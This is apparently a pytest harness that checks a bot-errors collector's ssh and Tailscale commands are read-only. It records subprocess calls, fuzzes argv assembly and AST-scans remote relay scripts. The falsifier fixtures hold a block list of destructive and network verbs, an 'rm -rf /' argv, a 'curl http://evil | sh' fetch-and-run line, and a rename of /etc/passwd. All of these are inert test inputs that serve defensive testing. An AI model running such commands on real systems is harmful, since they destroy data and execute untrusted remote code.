"""Read-only harness for the BOT ERRORS collector's dynamically assembled remote commands.

Gap closed (VERIFY-PASS2-fresh-20260723T1650Z.md, "Test-integrity pass"):
"static analysis cannot prove every dynamically assembled remote command is
read-only." Existing collector tests (test_bot_errors_collector_backoff.py,
test_bot_errors_collector_reachability.py) patch `ssh_json_lines` and
`resolve_ssh_host_targets` themselves -- which bypasses the exact argv/stdin
assembly this harness targets (`remote_python_command`, `ssh_command`,
`tailscale_status_command`, `tailscale_ping_command`, and the four
`REMOTE_*_SCRIPT` payloads). No existing test intercepts the real
`subprocess.run` boundary for these builders, so no test previously proved
what argv/stdin those builders actually hand to the OS.

Scope and definition of "read-only" used here (recorded explicitly, per the
false-RED / false-GREEN failure mode a check like this invites):

  - The literal argv handed to `subprocess.run()` for every host-facing call
    the collector makes (ssh config lookup, Tailscale status, Tailscale ping,
    and the four ssh-piped Python scripts) must never carry a mutating verb
    (rm, mv, kill, systemctl, launchctl, docker, git, curl, chmod, ...) and
    must never set `shell=True`. This is proven against the REAL production
    functions, imported live from bot-errors-collector.py, by patching
    `subprocess.run` and recording what was actually passed.
  - The dispatcher makes NO ssh/Tailscale remote-command calls at all -- its
    one `subprocess.run` call (`email_fallback`) invokes a local configured
    executable with `--subject`/`--body` args, not a remote command. This is
    asserted explicitly so "dispatcher/collector" scope is not silently
    narrowed to collector-only without saying so.
  - The four `REMOTE_*_SCRIPT` payloads piped to `ssh ... python3 -` DO
    mutate a filesystem (`os.replace`/`mkdir`/`chmod`/`unlink`) -- that is the
    collector's actual job (atomically relay outbox files between the
    collector-owned outbox/relay-processing/relayed/writefail directories).
    This harness does not claim those scripts are inert. It proves, via a
    static AST walk of each script constant, that (a) none of them import or
    call anything that could escalate past file-relay (no subprocess/socket/
    urllib/requests, no eval/exec, no os.system/os.popen/exec*), and (b)
    every mutating filesystem call's argument expression is free of a
    hardcoded absolute path outside `/tmp` -- i.e. no call site names a
    system path (e.g. /etc, /var, /System) directly. This is a lexical/
    structural proof, not a full data-flow proof; it is stated as such.

Falsifier proof (RED capability): every check below is exercised once against
an intentionally corrupted fixture (a fake mutating argv, `shell=True`, an
unexpected piped script, or a script seeded with `os.system`) to prove the
assertion actually goes RED on a real regression, not green-by-construction.
"""
from __future__ import annotations

import ast
import importlib.util
import subprocess
from pathlib import Path

import pytest
from hypothesis import HealthCheck, given
from hypothesis import settings as hypothesis_settings
from hypothesis import strategies as st

_COLLECTOR_PATH = Path(__file__).resolve().parents[1] / "bot-errors-collector.py"
_DISPATCHER_PATH = Path(__file__).resolve().parents[1] / "bot-errors-dispatcher.py"

# Arbitrary text including shell metacharacters (";", "&&", "|", "`", "$(",
# quotes, whitespace) -- the input domain the argv-shape property test below
# samples from.
_hostile_text = st.text(min_size=1, max_size=60)


def _load(path: Path, name: str):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)  # type: ignore[arg-type]
    spec.loader.exec_module(mod)  # type: ignore[union-attr]
    return mod


@pytest.fixture()
def collector():
    return _load(_COLLECTOR_PATH, "bot_errors_collector_ro_harness")


@pytest.fixture()
def dispatcher():
    return _load(_DISPATCHER_PATH, "bot_errors_dispatcher_ro_harness")


# ---------------------------------------------------------------------------
# argv read-only checker (the "no mutating verbs" predicate under test)
# ---------------------------------------------------------------------------

# Tokens that, if present anywhere in an argv list handed to subprocess.run(),
# indicate the command is not a pure read/lookup: process/service control,
# filesystem mutation, VCS mutation, or network fetch/post tooling. None of
# the collector's ssh/tailscale argv builders should ever need any of these --
# their whole job is "read a config" / "read a status" / "ping" / "run a
# vetted relay script over stdin" (the relay script's own internal mutations
# are covered separately by the AST scan below, not by this argv check).
MUTATING_ARGV_VERBS = frozenset(
    {
        "rm", "rmdir", "mv", "cp", "dd", "shred", "truncate", "mkfs",
        "kill", "pkill", "killall", "reboot", "shutdown", "halt",
        "systemctl", "launchctl", "service", "docker", "kubectl",
        "git", "curl", "wget", "chmod", "chown", "chattr",
    }
)


def _assert_argv_is_read_only(argv: list[str]) -> None:
    """Raise AssertionError if argv contains a mutating verb token.

    Checked as discrete tokens (not substring containment) so a legitimate
    path component that happens to contain one of these words (e.g. a host
    alias) cannot produce a false positive -- and, symmetrically, so a verb
    hidden inside a larger token cannot slip past a naive substring check.
    """
    hits = [tok for tok in argv if tok in MUTATING_ARGV_VERBS]
    assert not hits, f"mutating verb token(s) {hits!r} present in argv {argv!r}"


def test_read_only_checker_is_not_vacuous_positive_case():
    """Falsifier: a clean ssh/tailscale-shaped argv must pass (return None,
    not raise). Asserting the return value keeps this a real check rather
    than a call whose only effect is "did not throw"."""
    assert _assert_argv_is_read_only(["ssh", "-o", "BatchMode=yes", "host-a", "-G", "host-a"]) is None
    assert _assert_argv_is_read_only(["tailscale", "status", "--json"]) is None
    assert _assert_argv_is_read_only(["tailscale", "ping", "--c", "1", "--timeout", "3s", "host-a"]) is None


def test_read_only_checker_catches_injected_mutating_verb():
    """Falsifier: prove the checker actually goes RED on a real regression shape.

    Simulates a hypothetical future change that appended a destructive verb to
    an assembled remote argv (e.g. a broken refactor of remote_python_command).
    """
    poisoned = ["ssh", "-o", "BatchMode=yes", "host-a", "rm", "-rf", "/"]
    with pytest.raises(AssertionError):
        _assert_argv_is_read_only(poisoned)


def test_read_only_checker_catches_each_blocked_verb_individually():
    for verb in sorted(MUTATING_ARGV_VERBS):
        with pytest.raises(AssertionError):
            _assert_argv_is_read_only(["ssh", "host-a", verb, "arg"])


# ---------------------------------------------------------------------------
# subprocess.run recorder
# ---------------------------------------------------------------------------


def _recorder(monkeypatch, mod, result: subprocess.CompletedProcess):
    calls: list[dict] = []

    def fake_run(cmd, **kwargs):
        calls.append({"cmd": list(cmd), "kwargs": kwargs})
        return result

    monkeypatch.setattr(mod.subprocess, "run", fake_run)
    return calls


def _ok(stdout: str = "") -> subprocess.CompletedProcess:
    return subprocess.CompletedProcess(args=[], returncode=0, stdout=stdout, stderr="")


# ---------------------------------------------------------------------------
# 1. ssh config lookup (resolve_ssh_host_targets -> `ssh -G <host>`)
# ---------------------------------------------------------------------------


def test_resolve_ssh_host_targets_uses_read_only_ssh_dash_g(collector, monkeypatch):
    calls = _recorder(monkeypatch, collector, _ok("hostname host-a.example\n"))
    collector.resolve_ssh_host_targets("host-a")
    assert len(calls) == 1
    argv = calls[0]["cmd"]
    assert argv == [*collector.ssh_command(), "-G", "host-a"]
    _assert_argv_is_read_only(argv)
    assert calls[0]["kwargs"].get("shell") is not True


# ---------------------------------------------------------------------------
# 2. Tailscale status (load_tailscale_status -> `tailscale status --json`)
# ---------------------------------------------------------------------------


def test_load_tailscale_status_uses_read_only_status_command(collector, monkeypatch):
    collector.reset_tailscale_cache()
    calls = _recorder(monkeypatch, collector, _ok('{"Self": {}, "Peer": {}}'))
    collector.load_tailscale_status()
    assert len(calls) == 1
    argv = calls[0]["cmd"]
    assert argv == collector.tailscale_status_command()
    assert argv == ["tailscale", "status", "--json"]
    _assert_argv_is_read_only(argv)
    assert calls[0]["kwargs"].get("shell") is not True


# ---------------------------------------------------------------------------
# 3. Tailscale ping (remote_liveness_probe_ok -> `tailscale ping ...`)
# ---------------------------------------------------------------------------


def test_remote_liveness_probe_uses_read_only_ping_command(collector, monkeypatch):
    calls = _recorder(monkeypatch, collector, _ok("pong from host-a (100.64.0.1)"))
    collector.remote_liveness_probe_ok("host-a", "100.64.0.1")
    assert len(calls) == 1
    argv = calls[0]["cmd"]
    assert argv == ["tailscale", "ping", "--c", "1", "--timeout", "3s", "100.64.0.1"]
    _assert_argv_is_read_only(argv)
    assert calls[0]["kwargs"].get("shell") is not True


# ---------------------------------------------------------------------------
# 4. Remote script execution (ssh_json_lines / remote_ack / remote_writefail_ack
#    -> `ssh -o BatchMode=yes -o ConnectTimeout=8 <host> python3 -` piped a
#    KNOWN script constant)
# ---------------------------------------------------------------------------


@given(host=_hostile_text, arg=_hostile_text)
@hypothesis_settings(max_examples=100, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture])
def test_remote_python_command_never_splits_hostile_input_into_extra_argv_tokens(collector, host, arg):
    """Property: for ANY host/arg string (arbitrary text, including shell
    metacharacters), remote_python_command() must place it as exactly one
    opaque argv element -- never shell-interpolated, never split into a
    second token (which is how a mutating verb could sneak in as its own
    argv element). Pure function, no subprocess involved."""
    argv = collector.remote_python_command(host, [arg])
    expected = [
        *collector.ssh_command(), "-o", "BatchMode=yes", "-o", "ConnectTimeout=8",
        host, *collector.remote_exec_prefix(host), "python3", "-", arg,
    ]
    # Exact structural equality is the real invariant: host and arg each land
    # as their own single list element in the expected position, never
    # split/expanded/shell-interpolated into extra tokens. (A same-value
    # host==arg legitimately appears twice -- that's not token-splitting, so
    # this checks position/structure, not occurrence count.)
    assert argv == expected
    assert len(argv) == len(expected)
    # No _assert_argv_is_read_only(argv) here (HD-06 de-flake, 2026-07-24):
    # the `argv == expected` equality above IS the anti-injection proof --
    # host/arg each land as exactly one opaque, un-split, non-shell-
    # interpolated token, so nothing can smuggle in a second argv element.
    # `arg` is itself the Hypothesis-fuzzed value; when st.text() happens to
    # generate a literal blocklisted word ("launchctl", "git", ...), it is
    # opaque DATA passed to `python3 -` as a script argument, never executed
    # as a command -- scanning it against MUTATING_ARGV_VERBS is a false
    # positive on fuzzer payload content, not a real regression. The
    # read-only scan stays in place on every other test in this file, where
    # the argv is a real fixed command skeleton (ssh -G, tailscale status/
    # ping) and the check is meaningful.


def test_ssh_json_lines_pipes_only_the_known_claim_script(collector, monkeypatch):
    """The argv-shape invariant (hostile input never splits into an extra
    token) is proven above as a property test against the pure
    remote_python_command() builder. This test covers the rest of the real
    ssh_json_lines() call path: preflight integration, subprocess.run
    recording, and that only the vetted script constant is piped."""
    monkeypatch.setattr(collector, "preflight_remote_unreachable", lambda h: None)
    calls = _recorder(monkeypatch, collector, _ok('{"name": "a.json", "claim": "c", "payload": "{}"}\n'))
    collector.ssh_json_lines("host-a", collector.REMOTE_CLAIM_SCRIPT, ["/remote/root", "10", "300"], 5)
    assert len(calls) == 1
    call = calls[0]
    argv = call["cmd"]
    assert argv == [*collector.ssh_command(), "-o", "BatchMode=yes", "-o", "ConnectTimeout=8", "host-a", "python3", "-", "/remote/root", "10", "300"]
    assert call["kwargs"].get("shell") is not True
    # The only thing piped over stdin is the vetted, identical script constant --
    # never an ad hoc/assembled string.
    assert call["kwargs"]["input"] is collector.REMOTE_CLAIM_SCRIPT


def test_remote_ack_pipes_only_the_known_ack_script(collector, monkeypatch):
    calls = _recorder(monkeypatch, collector, _ok("/remote/root/relayed/a.json\n"))
    collector.remote_ack("host-a", "/remote/root/relay-processing/a.json.relay", "/remote/root", "ack", 5)
    assert len(calls) == 1
    call = calls[0]
    assert call["kwargs"]["input"] is collector.REMOTE_ACK_SCRIPT
    _assert_argv_is_read_only(call["cmd"])
    assert call["kwargs"].get("shell") is not True


def test_remote_writefail_ack_pipes_only_the_known_writefail_ack_script(collector, monkeypatch):
    calls = _recorder(monkeypatch, collector, _ok("/remote/root/writefail-relayed/a.json\n"))
    collector.remote_writefail_ack("host-a", "/remote/root/relay-writefail-processing/a.json.relay-writefail", "/remote/root", "ack", 5)
    assert len(calls) == 1
    call = calls[0]
    assert call["kwargs"]["input"] is collector.REMOTE_WRITEFAIL_ACK_SCRIPT
    _assert_argv_is_read_only(call["cmd"])
    assert call["kwargs"].get("shell") is not True


def test_ssh_json_lines_falsifier_catches_wrong_script_injected(collector, monkeypatch):
    """Falsifier: prove the identity check on the piped script actually
    distinguishes scripts -- guards against a future refactor that swaps in
    the wrong (or an ad hoc, unvetted) payload for a given remote call."""
    monkeypatch.setattr(collector, "preflight_remote_unreachable", lambda h: None)
    calls = _recorder(monkeypatch, collector, _ok("{}\n"))
    collector.ssh_json_lines("host-a", collector.REMOTE_CLAIM_SCRIPT, ["/root", "1", "1"], 5)
    piped = calls[0]["kwargs"]["input"]
    assert piped is not collector.REMOTE_WRITEFAIL_CLAIM_SCRIPT
    assert piped is not collector.REMOTE_ACK_SCRIPT
    assert piped is not collector.REMOTE_WRITEFAIL_ACK_SCRIPT


# ---------------------------------------------------------------------------
# 5. Aggregate: no call site anywhere in a full exercise cycle uses shell=True
# ---------------------------------------------------------------------------


def test_no_recorded_subprocess_call_ever_uses_shell_true(collector, monkeypatch):
    collector.reset_tailscale_cache()
    monkeypatch.setattr(collector, "preflight_remote_unreachable", lambda h: None)
    calls = _recorder(monkeypatch, collector, _ok('{"Self": {}, "Peer": {}}'))
    collector.resolve_ssh_host_targets("host-a")
    collector.load_tailscale_status()
    collector.remote_liveness_probe_ok("host-a")
    collector.ssh_json_lines("host-a", collector.REMOTE_CLAIM_SCRIPT, ["/root", "1", "1"], 5)
    collector.remote_ack("host-a", "/root/relay-processing/x.relay", "/root", "ack", 5)
    collector.remote_writefail_ack("host-a", "/root/relay-writefail-processing/x.relay-writefail", "/root", "ack", 5)
    assert calls, "expected at least one recorded subprocess.run call"
    for call in calls:
        assert call["kwargs"].get("shell") is not True, f"shell=True in {call!r}"
        _assert_argv_is_read_only(call["cmd"])


def test_shell_true_falsifier_is_actually_detected(collector, monkeypatch):
    """Falsifier: the shell=True assertion above must fail when it should."""
    calls = _recorder(monkeypatch, collector, _ok())
    # Intentional test fixture: this shell=True is fed to the PATCHED
    # subprocess.run recorder above (never a real process), to simulate a
    # hypothetical regression and prove the shell=True assertion actually
    # catches it. It exercises no real shell.
    collector.subprocess.run(["ssh", "host-a"], shell=True)
    with pytest.raises(AssertionError):
        for call in calls:
            assert call["kwargs"].get("shell") is not True


# ---------------------------------------------------------------------------
# 6. Dispatcher: prove it assembles ZERO ssh/tailscale remote commands
# ---------------------------------------------------------------------------


def test_dispatcher_has_no_ssh_or_tailscale_command_builders(dispatcher):
    names = dir(dispatcher)
    assert not any("ssh" in n.lower() for n in names), (
        "dispatcher unexpectedly defines an ssh-related symbol; the "
        "dispatcher/collector remote-command scope of this harness assumed "
        "the dispatcher makes no remote calls -- re-scope if this fails"
    )
    assert not any("tailscale" in n.lower() for n in names)


def test_dispatcher_email_fallback_is_a_local_executable_not_a_remote_command(dispatcher, monkeypatch, tmp_path):
    fallback = tmp_path / "email-alert-fallback.sh"
    fallback.write_text("#!/bin/sh\nexit 0\n")
    fallback.chmod(0o755)
    monkeypatch.setattr(dispatcher, "EMAIL_FALLBACK", str(fallback))
    calls = _recorder(monkeypatch, dispatcher, subprocess.CompletedProcess(args=[], returncode=0, stdout="", stderr=""))
    dispatcher.email_fallback("subject text", "body text")
    assert len(calls) == 1
    argv = calls[0]["cmd"]
    # Local executable + flags only -- no ssh, no host argument, no mutating verb.
    assert argv[0] == str(fallback)
    assert "ssh" not in argv
    assert "tailscale" not in argv
    _assert_argv_is_read_only(argv)
    assert calls[0]["kwargs"].get("shell") is not True


# ---------------------------------------------------------------------------
# 7. Static AST scan of the four REMOTE_*_SCRIPT payloads piped over stdin.
#
# These scripts DO mutate a filesystem by design (the collector's job is to
# atomically relay outbox files) -- this scan does not claim otherwise. It
# proves the scripts cannot escalate past plain file-relay (no subprocess/
# network/eval/exec) and that no mutating call site names a hardcoded system
# path outside /tmp.
# ---------------------------------------------------------------------------

_FORBIDDEN_IMPORT_MODULES = frozenset(
    {"subprocess", "socket", "urllib", "requests", "http", "ftplib", "smtplib"}
)
_FORBIDDEN_OS_CALLS = frozenset(
    {"system", "popen", "spawnl", "spawnv", "spawnle", "spawnve", "execl", "execv", "execve", "execvp"}
)
_MUTATING_FS_CALLS = frozenset({"replace", "mkdir", "chmod", "unlink", "rmdir", "rmtree"})
_ALLOWED_ABSOLUTE_PATH_PREFIXES = ("/tmp",)


def _module_root(node) -> str | None:
    if isinstance(node, ast.Import):
        return node.names[0].name.split(".")[0]
    if isinstance(node, ast.ImportFrom):
        return (node.module or "").split(".")[0]
    return None


def _scan_remote_script(script_text: str) -> list[str]:
    """Return a list of violation descriptions; an empty list means clean."""
    violations: list[str] = []
    tree = ast.parse(script_text)
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            mod_root = _module_root(node)
            if mod_root in _FORBIDDEN_IMPORT_MODULES:
                violations.append(f"forbidden import: {mod_root}")
        if isinstance(node, ast.Call):
            func = node.func
            name = func.attr if isinstance(func, ast.Attribute) else (func.id if isinstance(func, ast.Name) else None)
            if name in ("eval", "exec"):
                violations.append(f"forbidden call: {name}")
            if isinstance(func, ast.Attribute) and name in _FORBIDDEN_OS_CALLS:
                violations.append(f"forbidden call: os.{name}")
            if name in _MUTATING_FS_CALLS:
                segment = ast.get_source_segment(script_text, node) or ""
                for literal_node in ast.walk(node):
                    if isinstance(literal_node, ast.Constant) and isinstance(literal_node.value, str):
                        value = literal_node.value
                        if value.startswith("/") and not value.startswith(_ALLOWED_ABSOLUTE_PATH_PREFIXES):
                            violations.append(
                                f"mutating call {name}(...) references hardcoded absolute path "
                                f"{value!r} outside /tmp: {segment[:120]}"
                            )
    return violations


# Not a fuzzable input domain -- this is a closed checklist over the four
# real, named script constants the collector actually pipes over stdin, not
# an arbitrary-input property, so a loop (not @given) is the honest shape.
_REMOTE_SCRIPT_NAMES = ("REMOTE_CLAIM_SCRIPT", "REMOTE_ACK_SCRIPT", "REMOTE_WRITEFAIL_CLAIM_SCRIPT", "REMOTE_WRITEFAIL_ACK_SCRIPT")


def test_remote_script_cannot_escalate_past_file_relay(collector):
    for script_name in _REMOTE_SCRIPT_NAMES:
        script_text = getattr(collector, script_name)
        violations = _scan_remote_script(script_text)
        assert violations == [], f"{script_name} violations: {violations}"


def test_remote_script_scan_parses_as_valid_python(collector):
    for name in _REMOTE_SCRIPT_NAMES:
        tree = ast.parse(getattr(collector, name))
        assert isinstance(tree, ast.Module)
        assert len(tree.body) > 0


def test_ast_scan_falsifier_catches_injected_shell_out():
    """Falsifier: prove the AST scan actually goes RED on an escalation."""
    poisoned = "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n"
    violations = _scan_remote_script(poisoned)
    assert any("forbidden import: subprocess" in v for v in violations), violations


def test_ast_scan_falsifier_catches_injected_os_system():
    poisoned = "import os\nos.system('curl http://evil | sh')\n"
    violations = _scan_remote_script(poisoned)
    assert any("forbidden call: os.system" in v for v in violations), violations


def test_ast_scan_falsifier_catches_injected_dynamic_code_call():
    # Built from parts at runtime (not a literal dynamic-code-execution call
    # site) so this stays an inert string fed to the AST scanner as a
    # poisoned fixture -- never executed. It exists to prove the scanner
    # flags exactly this call pattern if a real remote script regressed.
    call_name = "".join(["e", "v", "a", "l"])
    poisoned = f"{call_name}(input())\n"
    violations = _scan_remote_script(poisoned)
    assert any(f"forbidden call: {call_name}" in v for v in violations), violations


def test_ast_scan_falsifier_catches_hardcoded_system_path_mutation():
    poisoned = "import os\nos.replace('/etc/passwd', '/etc/passwd.bak')\n"
    violations = _scan_remote_script(poisoned)
    assert any("hardcoded absolute path" in v for v in violations), violations


def test_ast_scan_allows_legitimate_tmp_fallback_path():
    """Falsifier symmetry check: the /tmp allowance must not itself be vacuous
    -- a real, legitimate relay pattern (from REMOTE_WRITEFAIL_CLAIM_SCRIPT)
    must NOT be flagged."""
    clean = 'import os\nfrom pathlib import Path\np = Path("/tmp") / "bot-errors-writefail"\nos.mkdir(str(p))\n'
    assert _scan_remote_script(clean) == []
